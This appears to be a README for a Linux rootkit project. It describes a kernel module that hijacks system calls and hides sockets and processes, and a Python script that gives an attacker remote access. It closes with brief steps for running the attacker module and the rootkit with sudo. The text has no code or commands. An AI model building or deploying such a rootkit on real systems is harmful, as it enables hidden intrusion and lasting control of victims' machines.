# Rootkit

### Overview
A linux Rootkit module that can hijack system calls and hides
sockets and processes. Alongside with it, a small python script runs
and gives the attacker remote access to the victim's machine.

### How to Use
1. Do not violate any condition that is written in 
`Victim/rootkit_sshd.py`
1. Run `Attacker/attacker_module.py on the attacker machine.
1. Run `run_rootkit` with sudo privilege. 